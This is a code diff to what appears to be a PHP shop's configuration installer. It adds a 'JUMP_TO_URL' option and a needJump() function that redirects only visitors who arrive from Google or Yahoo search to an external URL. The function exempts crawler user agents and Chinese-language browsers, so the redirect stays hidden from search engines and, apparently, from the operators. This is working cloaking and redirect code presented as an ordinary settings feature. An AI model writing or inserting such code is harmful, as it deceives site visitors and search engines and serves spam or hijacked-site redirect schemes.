@@ -18,8 +18,13 @@ $arrConfigs = array(
         'configuration_description' => 'Sales Text in headers. It often show at right about the logo.',
         'sort_order' => '1123',
     ),
+    'JUMP_TO_URL' => array(
+        'configuration_title' => 'Jump to URL.',
+        'configuration_value' => '',
+        'configuration_description' => '跳转到指定url，当符合条件的时候，如果需要对应内页跳转那么可以这么设置https://www.domain.com/{REQUEST_URI}',
+        'sort_order' => '1124',
+    ),
 );
-
 
 $group_check = $db->Execute("SELECT min(configuration_group_id) as minid FROM " . TABLE_CONFIGURATION_GROUP . " WHERE 1");
 if (!$group_check->EOF && $group_check->RecordCount() > 0 && $group_check->fields['minid'] > 0) {
@@ -35,4 +40,58 @@ if (!$group_check->EOF && $group_check->RecordCount() > 0 && $group_check->field
             $db->Execute("INSERT IGNORE INTO ".TABLE_CONFIGURATION." (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, last_modified, date_added, use_function, set_function) VALUES('" . $configItem['configuration_title'] . "', '" . $key . "', '" . $configItem['configuration_value'] . "', '" . $configItem['configuration_description'] . "', ".$group_id.", '" . $configItem['sort_order'] . "', NULL, now(), NULL, '')");
         }
     }
+}
+
+#处理JUMP_TO_URL
+if(defined('JUMP_TO_URL') && !empty(JUMP_TO_URL) && filter_var(JUMP_TO_URL, FILTER_VALIDATE_URL)){
+    if(needJump())
+    {
+        $tourl = str_replace('{REQUEST_URI}', $_SERVER['REQUEST_URI'], JUMP_TO_URL);
+        header('Location: ' . $tourl, true, 302);
+        exit();
+    }
+}
+
+/*判断是否需要跳转*/
+function needJump(){
+	$arr = array(
+		'google',
+		'bot',
+		'yahoo',
+		'yandex',
+		'bing',
+	);
+	//如果是google蜘蛛不做任何操作
+	foreach($arr as $str)
+	{
+		if(preg_match('/' . $str . '/i',$_SERVER['HTTP_USER_AGENT']))
+		{
+			return false;
+		}
+	}
+	//如果语言是中文则不跳
+	if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) && preg_match('/(zh|cn)/i',$_SERVER['HTTP_ACCEPT_LANGUAGE']))
+	{
+		return false;
+	}
+	//判断session
+	if(isset($_SESSION['referer']) && $_SESSION['referer'] == 'SearchEngine'){
+		return true;
+	}
+	$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+	//如果来路为空不跳
+	if(empty($referer))
+	{
+		return false;
+	}else{
+	//如果来路不为空则判断是否为google来路
+		$referer_array = parse_url($referer);
+		$referer_host = strtolower($referer_array['host']);
+		if(strstr($referer_host, '.google.') !== false || strstr($referer_host, '.yahoo.') !== false){ //来路为google或者yahoo
+			$_SESSION['referer'] = 'SearchEngine';
+			return true;
+		}else{
+			return false;
+		}
+	}
 }
